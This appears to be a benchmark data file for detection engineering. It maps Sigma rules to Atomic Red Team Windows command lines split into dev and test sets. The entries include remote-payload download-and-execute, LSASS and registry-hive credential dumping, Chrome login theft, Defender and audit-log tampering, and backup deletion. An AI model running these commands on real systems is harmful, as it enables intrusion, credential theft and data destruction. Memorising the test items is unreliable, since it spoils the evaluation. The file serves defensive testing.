@@ -1,0 +1,757 @@
+sigmahq_release: r2026-07-01
+atomic_red_team_commit: a0e3f9bc69fed2fd711bd1f1aa87a40c33482fe6
+dev_techniques:
+- T1053.005
+- T1490
+- T1543.003
+- T1547.001
+- T1555.003
+rules:
+- id: fb843269-508c-4b76-8b8d-88679db22ce7
+  title: Suspicious Execution of Powershell with Base64
+  path: rules/windows/process_creation/proc_creation_win_powershell_encode.yml
+  status: test
+  level: medium
+  technique: T1059.001
+  attack_tags:
+  - T1059.001
+  split: test
+  base_attacks:
+  - T1059.001-b01
+- id: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7
+  title: PowerShell Download Pattern
+  path: rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml
+  status: test
+  level: medium
+  technique: T1059.001
+  attack_tags:
+  - T1059.001
+  split: test
+  base_attacks:
+  - T1059.001-b02
+- id: 241e802a-b65e-484f-88cd-c2dc10f9206d
+  title: Read Contents From Stdin Via Cmd.EXE
+  path: rules/windows/process_creation/proc_creation_win_cmd_stdin_redirect.yml
+  status: test
+  level: medium
+  technique: T1059.003
+  attack_tags:
+  - T1059.003
+  split: test
+  base_attacks:
+  - T1059.003-b01
+- id: 526be59f-a573-4eea-b5f7-f0973207634d
+  title: Process Creation Attempt via Wmic.EXE
+  path: rules/windows/process_creation/proc_creation_win_wmic_process_creation.yml
+  status: test
+  level: medium
+  technique: T1047
+  attack_tags:
+  - T1047
+  split: test
+  base_attacks:
+  - T1047-b01
+  - T1047-b02
+  - T1047-b03
+- id: 05c36dd6-79d6-4a9a-97da-3db20298ab2d
+  title: XSL Script Execution Via WMIC.EXE
+  path: rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml
+  status: test
+  level: medium
+  technique: T1047
+  attack_tags:
+  - T1047
+  - T1059.005
+  - T1059.007
+  - T1220
+  split: test
+  base_attacks:
+  - T1047-b04
+- id: e218595b-bbe7-4ee5-8a96-f32a24ad3468
+  title: Suspicious Curl.EXE Download
+  path: rules/windows/process_creation/proc_creation_win_curl_susp_download.yml
+  status: test
+  level: high
+  technique: T1105
+  attack_tags:
+  - T1105
+  split: test
+  base_attacks:
+  - T1105-b01
+  - T1105-b02
+  - T1105-b03
+  - T1105-b04
+  - T1105-b05
+  - T1105-b06
+  - T1105-b07
+  - T1105-b08
+- id: 46123129-1024-423e-9fae-43af4a0fa9a5
+  title: File Download Via Windows Defender MpCmpRun.EXE
+  path: rules/windows/process_creation/proc_creation_win_mpcmdrun_download_arbitrary_file.yml
+  status: test
+  level: high
+  technique: T1105
+  attack_tags:
+  - T1105
+  - T1218
+  split: test
+  base_attacks:
+  - T1105-b09
+- id: 19b08b1c-861d-4e75-a1ef-ea0c1baf202b
+  title: Suspicious Download Via Certutil.EXE
+  path: rules/windows/process_creation/proc_creation_win_certutil_download.yml
+  status: test
+  level: medium
+  technique: T1027
+  attack_tags:
+  - T1027
+  - T1105
+  split: test
+  base_attacks:
+  - T1027-b01
+- id: d059842b-6b9d-4ed1-b5c3-5b89143c6ede
+  title: File Download Via Bitsadmin
+  path: rules/windows/process_creation/proc_creation_win_bitsadmin_download.yml
+  status: test
+  level: medium
+  technique: T1036.003
+  attack_tags:
+  - T1036.003
+  - T1105
+  - T1197
+  split: test
+  base_attacks:
+  - T1036.003-b01
+  - T1036.003-b02
+  - T1036.003-b03
+- id: de587dce-915e-4218-aac4-835ca6af6f70
+  title: Potential Persistence Attempt Via Run Keys Using Reg.EXE
+  path: rules/windows/process_creation/proc_creation_win_reg_add_run_key.yml
+  status: test
+  level: medium
+  technique: T1547.001
+  attack_tags:
+  - T1547.001
+  split: dev
+  base_attacks:
+  - T1547.001-b01
+  - T1547.001-b02
+- id: 24357373-078f-44ed-9ac4-6d334a668a11
+  title: Direct Autorun Keys Modification
+  path: rules/windows/process_creation/proc_creation_win_reg_direct_asep_registry_keys_modification.yml
+  status: test
+  level: medium
+  technique: T1547.001
+  attack_tags:
+  - T1547.001
+  split: dev
+  base_attacks:
+  - T1547.001-b01
+  - T1547.001-b02
+- id: 24c8392b-aa3c-46b7-a545-43f71657fe98
+  title: Suspicious Schtasks Schedule Types
+  path: rules/windows/process_creation/proc_creation_win_schtasks_schedule_type.yml
+  status: test
+  level: high
+  technique: T1053.005
+  attack_tags:
+  - T1053.005
+  split: dev
+  base_attacks:
+  - T1053.005-b01
+  - T1053.005-b02
+  - T1053.005-b03
+- id: 89ca78fd-b37c-4310-b3d3-81a023f83936
+  title: Schtasks Creation Or Modification With SYSTEM Privileges
+  path: rules/windows/process_creation/proc_creation_win_schtasks_system.yml
+  status: test
+  level: high
+  technique: T1053.005
+  attack_tags:
+  - T1053.005
+  split: dev
+  base_attacks:
+  - T1053.005-b04
+- id: 17a1be64-8d88-40bf-b5ff-a4f7a50ebcc8
+  title: Suspicious New Service Creation
+  path: rules/windows/process_creation/proc_creation_win_susp_service_creation.yml
+  status: test
+  level: high
+  technique: T1543.003
+  attack_tags:
+  - T1543.003
+  split: dev
+  base_attacks:
+  - T1543.003-b01
+  - T1543.003-b02
+  - T1543.003-b03
+- id: a7ee1722-c3c5-aeff-3212-c777e4733217
+  title: Disable Windows Defender AV Security Monitoring
+  path: rules/windows/process_creation/proc_creation_win_powershell_disable_defender_av_security_monitoring.yml
+  status: test
+  level: high
+  technique: T1685
+  attack_tags:
+  - T1685
+  split: test
+  base_attacks:
+  - T1685-b01
+  - T1685-b02
+- id: 0a13e132-651d-11eb-ae93-0242ac130002
+  title: Audit Policy Tampering Via Auditpol
+  path: rules/windows/process_creation/proc_creation_win_auditpol_susp_execution.yml
+  status: test
+  level: high
+  technique: T1685.001
+  attack_tags:
+  - T1685.001
+  split: test
+  base_attacks:
+  - T1685.001-b01
+  - T1685.001-b02
+  - T1685.001-b03
+  - T1685.001-b04
+  - T1685.001-b05
+- id: cc36992a-4671-4f21-a91d-6c2b72a2edf5
+  title: Suspicious Eventlog Clearing or Configuration Change Activity
+  path: rules/windows/process_creation/proc_creation_win_susp_eventlog_clear.yml
+  status: stable
+  level: high
+  technique: T1685.001
+  attack_tags:
+  - T1685.001
+  - T1685.005
+  split: test
+  base_attacks:
+  - T1685.001-b06
+  - T1685.001-b07
+- id: e593cf51-88db-4ee1-b920-37e89012a3c9
+  title: Potentially Suspicious Rundll32 Activity
+  path: rules/windows/process_creation/proc_creation_win_rundll32_susp_activity.yml
+  status: test
+  level: medium
+  technique: T1218.011
+  attack_tags:
+  - T1218.011
+  split: test
+  base_attacks:
+  - T1218.011-b01
+  - T1218.011-b02
+  - T1218.011-b03
+  - T1218.011-b04
+  - T1218.011-b05
+  - T1218.011-b06
+  - T1218.011-b07
+  - T1218.011-b08
+  - T1218.011-b09
+  - T1218.011-b10
+- id: 867356ee-9352-41c9-a8f2-1be690d78216
+  title: Potentially Suspicious Regsvr32 HTTP/FTP Pattern
+  path: rules/windows/process_creation/proc_creation_win_regsvr32_network_pattern.yml
+  status: test
+  level: medium
+  technique: T1218.010
+  attack_tags:
+  - T1218.010
+  split: test
+  base_attacks:
+  - T1218.010-b01
+- id: b98d0db6-511d-45de-ad02-e82a98729620
+  title: Remotely Hosted HTA File Executed Via Mshta.EXE
+  path: rules/windows/process_creation/proc_creation_win_mshta_http.yml
+  status: test
+  level: high
+  technique: T1218.005
+  attack_tags:
+  - T1218.005
+  split: test
+  base_attacks:
+  - T1218.005-b01
+- id: 8150732a-0c9d-4a99-82b9-9efb9b90c40c
+  title: Suspicious Msiexec Quiet Install From Remote Location
+  path: rules/windows/process_creation/proc_creation_win_msiexec_install_remote.yml
+  status: test
+  level: medium
+  technique: T1218.007
+  attack_tags:
+  - T1218.007
+  split: test
+  base_attacks:
+  - T1218.007-b01
+- id: 646ea171-dded-4578-8a4d-65e9822892e3
+  title: Process Memory Dump Via Comsvcs.DLL
+  path: rules/windows/process_creation/proc_creation_win_rundll32_process_dump_via_comsvcs.yml
+  status: test
+  level: high
+  technique: T1003.001
+  attack_tags:
+  - T1003.001
+  - T1036
+  split: test
+  base_attacks:
+  - T1003.001-b01
+- id: fd877b94-9bb5-4191-bb25-d79cbd93c167
+  title: Dumping of Sensitive Hives Via Reg.EXE
+  path: rules/windows/process_creation/proc_creation_win_reg_dumping_sensitive_hives.yml
+  status: test
+  level: high
+  technique: T1003.002
+  attack_tags:
+  - T1003.002
+  - T1003.004
+  - T1003.005
+  split: test
+  base_attacks:
+  - T1003.002-b01
+  - T1003.002-b02
+  - T1003.002-b03
+  - T1003.002-b04
+  - T1003.002-b05
+  - T1003.002-b06
+- id: 47147b5b-9e17-4d76-b8d2-7bac24c5ce1b
+  title: Potential Browser Data Stealing
+  path: rules/windows/process_creation/proc_creation_win_susp_copy_browser_data.yml
+  status: test
+  level: medium
+  technique: T1555.003
+  attack_tags:
+  - T1555.003
+  split: dev
+  base_attacks:
+  - T1555.003-b01
+- id: 1444443e-6757-43e4-9ea4-c8fc705f79a2
+  title: Boot Configuration Tampering Via Bcdedit.EXE
+  path: rules/windows/process_creation/proc_creation_win_bcdedit_boot_conf_tamper.yml
+  status: stable
+  level: high
+  technique: T1490
+  attack_tags:
+  - T1490
+  split: dev
+  base_attacks:
+  - T1490-b01
+  - T1490-b02
+- id: 639c9081-f482-47d3-a0bd-ddee3d4ecd76
+  title: All Backups Deleted Via Wbadmin.EXE
+  path: rules/windows/process_creation/proc_creation_win_wbadmin_delete_all_backups.yml
+  status: test
+  level: high
+  technique: T1490
+  attack_tags:
+  - T1490
+  split: dev
+  base_attacks:
+  - T1490-b03
+- id: c947b146-0abc-4c87-9c64-b17e9d7274a2
+  title: Shadow Copies Deletion Using Operating Systems Utilities
+  path: rules/windows/process_creation/proc_creation_win_susp_shadow_copies_deletion.yml
+  status: stable
+  level: high
+  technique: T1490
+  attack_tags:
+  - T1070
+  - T1490
+  split: dev
+  base_attacks:
+  - T1490-b04
+  - T1490-b05
+  - T1490-b06
+  - T1490-b07
+base_attacks:
+- event_id: T1059.001-b01
+  technique: T1059.001
+  art_test: PowerShell Command Execution
+  image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+  command_line: powershell.exe -e  JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1059.001-b02
+  technique: T1059.001
+  art_test: Invoke-AppPathBypass
+  image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+  command_line: Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1');
+    Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1059.003-b01
+  technique: T1059.003
+  art_test: Command Prompt read contents from CMD file and execute
+  image: C:\Windows\System32\cmd.exe
+  command_line: cmd /r cmd<"C:\AtomicRedTeam\atomics\T1059.003\src\t1059.003_cmd.cmd"
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1047-b01
+  technique: T1047
+  art_test: WMI Execute Local Process
+  image: C:\Windows\System32\wmic.exe
+  command_line: wmic process call create notepad.exe
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1047-b02
+  technique: T1047
+  art_test: WMI Execute Remote Process
+  image: C:\Windows\System32\wmic.exe
+  command_line: wmic /user:DOMAIN\Administrator /password:P@ssw0rd1 /node:"127.0.0.1" process call create notepad.exe
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1047-b03
+  technique: T1047
+  art_test: WMI Execute rundll32
+  image: C:\Windows\System32\wmic.exe
+  command_line: wmic /node:127.0.0.1 process call create "rundll32.exe \"C:\AtomicRedTeam\atomics\..\ExternalPayloads\calc.dll\" StartW"
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1047-b04
+  technique: T1047
+  art_test: WMIC bypass using local XSL file
+  image: C:\Windows\System32\wmic.exe
+  command_line: wmic process list /FORMAT:"C:\AtomicRedTeam\atomics\T1220\src\wmicscript.xsl"
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1105-b01
+  technique: T1105
+  art_test: Curl Download File
+  image: C:\Windows\System32\Curl.exe
+  command_line: C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\users\public\music\allthethingsx64.dll
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1105-b02
+  technique: T1105
+  art_test: Curl Download File
+  image: C:\Windows\System32\Curl.exe
+  command_line: C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll --output c:\users\public\music\allthethingsx64.dll
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1105-b03
+  technique: T1105
+  art_test: Curl Download File
+  image: C:\Windows\System32\Curl.exe
+  command_line: C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o c:\programdata\allthethingsx64.dll
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1105-b04
+  technique: T1105
+  art_test: Curl Download File
+  image: C:\Windows\System32\Curl.exe
+  command_line: C:\Windows\System32\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\Users\analyst\AppData\Local\Temp\allthethingsx64.dll
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1105-b05
+  technique: T1105
+  art_test: Curl Upload File
+  image: C:\Windows\System32\Curl.exe
+  command_line: C:\Windows\System32\Curl.exe -T c:\temp\atomictestfile.txt www.example.com
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1105-b06
+  technique: T1105
+  art_test: Curl Upload File
+  image: C:\Windows\System32\Curl.exe
+  command_line: C:\Windows\System32\Curl.exe --upload-file c:\temp\atomictestfile.txt www.example.com
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1105-b07
+  technique: T1105
+  art_test: Curl Upload File
+  image: C:\Windows\System32\Curl.exe
+  command_line: C:\Windows\System32\Curl.exe -d c:\temp\atomictestfile.txt www.example.com
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1105-b08
+  technique: T1105
+  art_test: Curl Upload File
+  image: C:\Windows\System32\Curl.exe
+  command_line: C:\Windows\System32\Curl.exe --data c:\temp\atomictestfile.txt www.example.com
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1105-b09
+  technique: T1105
+  art_test: Download a File with Windows Defender MpCmdRun.exe
+  image: C:\Windows\System32\mpcmdrun.exe
+  command_line: MpCmdRun.exe -DownloadFile -url https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -path C:\Users\analyst\AppData\Local\Temp\Atomic-license.txt
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1027-b01
+  technique: T1027
+  art_test: certutil download (verifyctl)
+  image: C:\Windows\System32\certutil.exe
+  command_line: certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
+  parent_image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+- event_id: T1036.003-b01
+  technique: T1036.003
+  art_test: Windows - BITSAdmin BITS Download
+  image: C:\Windows\System32\bitsadmin.exe
+  command_line: C:\Windows\System32\bitsadmin.exe /transfer qcxjb7 /Priority HIGH https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt C:\Users\analyst\AppData\Local\Temp\Atomic-license.txt
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1036.003-b02
+  technique: T1036.003
+  art_test: Bitsadmin Download (cmd)
+  image: C:\Windows\System32\bitsadmin.exe
+  command_line: bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\analyst\AppData\Local\Temp\bitsadmin1_flag.ps1
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1036.003-b03
+  technique: T1036.003
+  art_test: Persist, Download, & Execute
+  image: C:\Windows\System32\bitsadmin.exe
+  command_line: bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\analyst\AppData\Local\Temp\bitsadmin3_flag.ps1
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1547.001-b01
+  technique: T1547.001
+  art_test: Reg Key Run
+  image: C:\Windows\System32\reg.exe
+  command_line: REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "C:\Path\AtomicRedTeam.exe"
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1547.001-b02
+  technique: T1547.001
+  art_test: Reg Key RunOnce
+  image: C:\Windows\System32\reg.exe
+  command_line: REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Path\AtomicRedTeam.dll"
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1053.005-b01
+  technique: T1053.005
+  art_test: Scheduled Task Startup Script
+  image: C:\Windows\System32\schtasks.exe
+  command_line: schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1053.005-b02
+  technique: T1053.005
+  art_test: Scheduled task Local
+  image: C:\Windows\System32\schtasks.exe
+  command_line: SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1053.005-b03
+  technique: T1053.005
+  art_test: Turla KopiLuwak Scheduled Task for JavaScript Stager
+  image: C:\Windows\System32\schtasks.exe
+  command_line: schtasks /create /TN "ProactiveScan" /TR "wscript.exe \"C:\Users\analyst\AppData\Roaming\Microsoft\Chkdsk.js\" -scan Kdw6gG7cpOSZsBeH" /SC ONLOGON /F
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1053.005-b04
+  technique: T1053.005
+  art_test: Scheduled Task Startup Script
+  image: C:\Windows\System32\schtasks.exe
+  command_line: schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1543.003-b01
+  technique: T1543.003
+  art_test: Service Installation CMD
+  image: C:\Windows\System32\sc.exe
+  command_line: sc.exe create AtomicTestService_CMD binPath= "C:\AtomicRedTeam\atomics\T1543.003\bin\AtomicService.exe" start=auto  type=Own
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1543.003-b02
+  technique: T1543.003
+  art_test: TinyTurla backdoor service w64time
+  image: C:\Windows\System32\sc.exe
+  command_line: sc create W64Time binPath= "c:\Windows\System32\svchost.exe -k TimeService" type= share start=auto
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1543.003-b03
+  technique: T1543.003
+  art_test: Remote Service Installation CMD
+  image: C:\Windows\System32\sc.exe
+  command_line: sc.exe \\localhost create AtomicTestService_CMD binPath= "C:\AtomicRedTeam\atomics\T1543.003\bin\AtomicService.exe" start=auto type=Own
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1685-b01
+  technique: T1685
+  art_test: Tamper with Windows Defender Command Prompt
+  image: C:\Windows\System32\sc.exe
+  command_line: sc stop WinDefend
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1685-b02
+  technique: T1685
+  art_test: Tamper with Windows Defender Command Prompt
+  image: C:\Windows\System32\sc.exe
+  command_line: sc config WinDefend start=disabled
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1685.001-b01
+  technique: T1685.001
+  art_test: Impair Windows Audit Log Policy
+  image: C:\Windows\System32\auditpol.exe
+  command_line: auditpol /set /category:"Account Logon" /success:disable /failure:disable
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1685.001-b02
+  technique: T1685.001
+  art_test: Impair Windows Audit Log Policy
+  image: C:\Windows\System32\auditpol.exe
+  command_line: auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1685.001-b03
+  technique: T1685.001
+  art_test: Impair Windows Audit Log Policy
+  image: C:\Windows\System32\auditpol.exe
+  command_line: auditpol /set /category:"Detailed Tracking" /success:disable
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1685.001-b04
+  technique: T1685.001
+  art_test: Clear Windows Audit Policy Config
+  image: C:\Windows\System32\auditpol.exe
+  command_line: auditpol /clear /y
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1685.001-b05
+  technique: T1685.001
+  art_test: Clear Windows Audit Policy Config
+  image: C:\Windows\System32\auditpol.exe
+  command_line: auditpol /remove /allusers
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1685.001-b06
+  technique: T1685.001
+  art_test: Disable Event Logging with wevtutil
+  image: C:\Windows\System32\wevtutil.exe
+  command_line: wevtutil sl "Microsoft-Windows-IKE/Operational" /e:false
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1685.001-b07
+  technique: T1685.001
+  art_test: Clear Logs
+  image: C:\Windows\System32\wevtutil.exe
+  command_line: wevtutil cl System
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1218.011-b01
+  technique: T1218.011
+  art_test: Rundll32 advpack.dll Execution
+  image: C:\Windows\System32\rundll32.exe
+  command_line: rundll32.exe advpack.dll,LaunchINFSection "C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf",DefaultInstall_SingleUser,1,
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1218.011-b02
+  technique: T1218.011
+  art_test: Rundll32 ieadvpack.dll Execution
+  image: C:\Windows\System32\rundll32.exe
+  command_line: rundll32.exe ieadvpack.dll,LaunchINFSection "C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011.inf",DefaultInstall_SingleUser,1,
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1218.011-b03
+  technique: T1218.011
+  art_test: Rundll32 syssetup.dll Execution
+  image: C:\Windows\System32\rundll32.exe
+  command_line: rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 "C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf"
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1218.011-b04
+  technique: T1218.011
+  art_test: Rundll32 setupapi.dll Execution
+  image: C:\Windows\System32\rundll32.exe
+  command_line: rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 "C:\AtomicRedTeam\atomics\T1218.011\src\T1218.011_DefaultInstall.inf"
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1218.011-b05
+  technique: T1218.011
+  art_test: Execution of HTA and VBS Files using Rundll32 and URL.dll
+  image: C:\Windows\System32\rundll32.exe
+  command_line: rundll32.exe url.dll,OpenURL "C:\AtomicRedTeam\atomics\T1218.011\src\index.hta"
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1218.011-b06
+  technique: T1218.011
+  art_test: Execution of HTA and VBS Files using Rundll32 and URL.dll
+  image: C:\Windows\System32\rundll32.exe
+  command_line: rundll32.exe URL.dll,FileProtocolHandler "C:\AtomicRedTeam\atomics\T1218.011\src\akteullen.vbs"
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1218.011-b07
+  technique: T1218.011
+  art_test: Launches an executable using Rundll32 and pcwutl.dll
+  image: C:\Windows\System32\rundll32.exe
+  command_line: rundll32.exe pcwutl.dll,LaunchApplication C:\Windows\System32\notepad.exe
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1218.011-b08
+  technique: T1218.011
+  art_test: Rundll32 with Control_RunDLL
+  image: C:\Windows\System32\rundll32.exe
+  command_line: rundll32.exe shell32.dll,Control_RunDLL "C:\AtomicRedTeam\atomics\T1047\bin\calc.dll"
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1218.011-b09
+  technique: T1218.011
+  art_test: Rundll32 execute command via FileProtocolHandler
+  image: C:\Windows\System32\rundll32.exe
+  command_line: rundll32.exe url.dll,FileProtocolHandler calc.exe
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1218.011-b10
+  technique: T1218.011
+  art_test: Rundll32 execute payload by calling RouteTheCall
+  image: C:\Windows\System32\rundll32.exe
+  command_line: rundll32.exe zipfldr.dll,RouteTheCall "'C:\Windows\System32\calc.exe'"
+  parent_image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+- event_id: T1218.010-b01
+  technique: T1218.010
+  art_test: Regsvr32 remote COM scriptlet execution
+  image: C:\Windows\system32\regsvr32.exe
+  command_line: C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1218.005-b01
+  technique: T1218.005
+  art_test: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
+  image: C:\Windows\System32\mshta.exe
+  command_line: mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1218.007-b01
+  technique: T1218.007
+  art_test: Msiexec.exe - Execute Remote MSI file
+  image: c:\windows\system32\msiexec.exe
+  command_line: c:\windows\system32\msiexec.exe /q /i "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/bin/T1218.007_JScript.msi"
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1003.001-b01
+  technique: T1003.001
+  art_test: Dump LSASS.exe Memory using comsvcs.dll
+  image: C:\Windows\System32\rundll32.exe
+  command_line: C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 692 C:\Users\analyst\AppData\Local\Temp\lsass-comsvcs.dmp full
+  parent_image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+- event_id: T1003.002-b01
+  technique: T1003.002
+  art_test: Registry dump of SAM, creds, and secrets
+  image: C:\Windows\System32\reg.exe
+  command_line: reg save HKLM\sam C:\Users\analyst\AppData\Local\Temp\sam
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1003.002-b02
+  technique: T1003.002
+  art_test: Registry dump of SAM, creds, and secrets
+  image: C:\Windows\System32\reg.exe
+  command_line: reg save HKLM\system C:\Users\analyst\AppData\Local\Temp\system
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1003.002-b03
+  technique: T1003.002
+  art_test: Registry dump of SAM, creds, and secrets
+  image: C:\Windows\System32\reg.exe
+  command_line: reg save HKLM\security C:\Users\analyst\AppData\Local\Temp\security
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1003.002-b04
+  technique: T1003.002
+  art_test: Dumping of SAM, creds, and secrets(Reg Export)
+  image: C:\Windows\System32\reg.exe
+  command_line: reg export HKLM\sam C:\Users\analyst\AppData\Local\Temp\sam
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1003.002-b05
+  technique: T1003.002
+  art_test: Dumping of SAM, creds, and secrets(Reg Export)
+  image: C:\Windows\System32\reg.exe
+  command_line: reg export HKLM\system C:\Users\analyst\AppData\Local\Temp\system
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1003.002-b06
+  technique: T1003.002
+  art_test: Dumping of SAM, creds, and secrets(Reg Export)
+  image: C:\Windows\System32\reg.exe
+  command_line: reg export HKLM\security C:\Users\analyst\AppData\Local\Temp\security
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1555.003-b01
+  technique: T1555.003
+  art_test: Dump Chrome Login Data with esentutl
+  image: C:\Windows\System32\esentutl.exe
+  command_line: esentutl.exe /y "C:\Users\analyst\AppData\Local\Google\Chrome\User Data\Default\Login Data" /d "C:\Users\analyst\AppData\Local\Temp\T1555.003_Login_Data.tmp"
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1490-b01
+  technique: T1490
+  art_test: Windows - Disable Windows Recovery Console Repair
+  image: C:\Windows\System32\bcdedit.exe
+  command_line: bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1490-b02
+  technique: T1490
+  art_test: Windows - Disable Windows Recovery Console Repair
+  image: C:\Windows\System32\bcdedit.exe
+  command_line: bcdedit.exe /set {default} recoveryenabled no
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1490-b03
+  technique: T1490
+  art_test: Windows - wbadmin Delete systemstatebackup
+  image: C:\Windows\System32\wbadmin.exe
+  command_line: wbadmin delete systemstatebackup -keepVersions:0
+  parent_image: C:\Windows\System32\cmd.exe
+- event_id: T1490-b04
+  technique: T1490
+  art_test: Windows - Delete Volume Shadow Copies
+  image: C:\Windows\System32\vssadmin.exe
